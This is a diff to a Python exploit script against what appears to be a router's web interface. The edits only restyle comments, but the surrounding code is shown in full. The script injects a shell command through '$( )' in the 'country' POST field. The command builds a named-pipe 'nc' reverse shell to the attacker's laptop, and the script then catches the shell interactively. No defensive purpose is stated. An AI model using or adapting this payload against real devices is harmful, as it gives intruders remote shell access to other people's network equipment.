@@ -68,15 +68,15 @@ listener = listen(shell_port)
 print(f"[+] Started listener on port {shell_port}...")
 
 try:
-    # STEP 1: Set valid country
+    # set valid country
     print("[+] Step 1: Setting country to US...")
     send_post("operation=write&country=US")
     sleep(1)
 
-    # STEP 2: Inject shell command inside the $( ) block
+    # inject shell command inside the $( ) block
     print("[+] Step 2: Injecting reverse shell...")
     
-    # We clear out old nc processes, execute the pipe in the background, and crucially, 
+    # we clear out old nc processes, execute the pipe in the background, and crucially, 
     # use "echo US" at the end. This ensures $(cmd) evaluates to "US", 
     # making the router path look like /tmp/merge/US/BR so it completes cleanly.
     rev_shell_cmd = f"killall nc;rm -f /tmp/f4;mknod /tmp/f4 p;(cat /tmp/f4|/bin/sh -i 2>&1|nc {laptop_ip} {shell_port} >/tmp/f4 &);echo US"
@@ -84,11 +84,11 @@ try:
     payload = f"$({rev_shell_cmd})"
     encoded_body = f"operation=write&country=" + urllib.parse.quote(payload)
 
-    # Send payload and keep the trigger socket briefly alive
+    # send payload and keep the trigger socket briefly alive
     trigger_conn = send_post(encoded_body, close_immediately=False)
     print("[+] Packet sent, waiting for shell...")
 
-    # STEP 3: Catch the shell
+    # catch the shell
     client_conn = listener.wait_for_connection()
     print("[+] Success! Dropping into interactive mode:")
     
